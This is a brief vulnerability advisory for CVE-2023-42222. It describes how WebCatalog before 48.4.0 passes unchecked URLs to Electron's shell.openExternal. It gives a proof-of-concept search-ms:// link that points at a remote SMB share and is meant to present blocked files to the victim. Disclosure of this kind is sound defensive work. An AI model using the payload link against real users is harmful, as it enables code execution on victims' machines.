# CVE-2023-42222

## Vulnerability summary
WebCatalog before version 48.4.0 calls the Electron shell.openExternal function without verifying that the URL is for an http or https resource, in some circumstances. This vulnerability allows an attacker to execute code on the victims machine by sending messages containing links with arbitrary protocols. The victim has to interact with the link and sees the URL that is opened.

## Vulnerability Scan output
![SAST](sast.JPG)

## PoC Overview
![PoC](webcatalog_gitbook.gif)

## PoC information
The vulnerability can be confirmed by syncing a page that allows arbitary URLs. If a website is synced that contains search-ms://query=PsExec.exe&crumb=location://live.sysinternals.com/tools then an external SMB connection is created. This can then be used to bypass security protections on the local machine and present malicious files to the user, which would usually be blocked.
